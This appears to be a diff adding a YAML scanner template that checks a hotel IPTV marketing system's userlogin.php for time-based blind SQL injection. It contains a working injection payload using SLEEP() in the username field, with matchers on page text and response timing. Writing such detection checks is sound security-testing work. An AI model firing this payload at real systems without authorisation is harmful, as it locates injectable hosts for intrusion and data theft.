@@ -1,0 +1,33 @@
+id: poc-yaml-hsm-iptv-system-userlogin-sqli
+info:
+  name: 酒店智慧营销IPTV系统 userlogin SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+variables:
+  t1: "{{rand_int(5,10)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+http:
+  - raw:
+      - |
+        POST /xsiptva/cniptv/userlogin.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        username=admin' AND (SELECT 6707 FROM (SELECT(SLEEP({{t1}})))mQbf) AND '1'='1&password=admin
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "欢迎您登录IPTV管理平台"
+          - "密码错误"
+      - type: dsl
+        dsl:
+          - "duration > to_number(t1)"
+          - "duration < to_number(t2)"
